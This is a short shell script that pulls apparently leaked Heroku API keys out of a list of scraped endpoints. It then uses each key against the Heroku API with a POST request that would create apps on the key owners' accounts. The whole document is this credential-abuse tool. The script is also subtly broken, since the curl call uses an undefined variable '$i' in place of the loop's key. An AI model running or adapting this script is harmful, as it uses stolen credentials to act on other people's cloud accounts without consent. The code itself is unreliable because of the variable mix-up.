cat endpoints.txt | grep Heroku | anew heroku_key.txt
awk '{print $5 "\t" $6}' heroku_key.txt | anew only_keys.txt

File="only_keys.txt"
Lines=$(cat $File)
for Line in $Lines
do	 
	echo "$Line"
	curl -X POST https://api.heroku.com/apps -H "Accept: application/vnd.heroku+json; version=3" -H "Authorization: Bearer $i"
done


